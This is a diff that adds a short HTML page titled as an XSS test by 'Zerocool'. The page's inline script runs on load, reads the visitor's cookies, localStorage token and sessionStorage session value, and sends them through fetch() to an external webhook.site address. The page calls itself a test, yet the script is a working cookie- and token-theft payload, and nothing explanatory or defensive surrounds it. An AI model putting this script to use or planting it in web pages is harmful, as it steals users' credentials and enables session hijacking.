@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test BY Zerocool</title>
+</head>
+<body>
+    <h1>Hello, this is a test page create by Zerocool</h1>
+    <script>
+        // Get cookies
+        let cookies = document.cookie;
+        
+        // get from localStorage if exist
+        let storage = localStorage.getItem('token') || 'No token found';
+        
+        // 3- send to my Webhook.site 
+        fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?cookie=' + encodeURIComponent(cookies) + '&storage=' + encodeURIComponent(storage));
+        
+        // 4- try to take the session storage 
+        let session = sessionStorage.getItem('session') || 'No session found';
+        fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?session=' + encodeURIComponent(session));
+    </script>
+</body>
+</html>
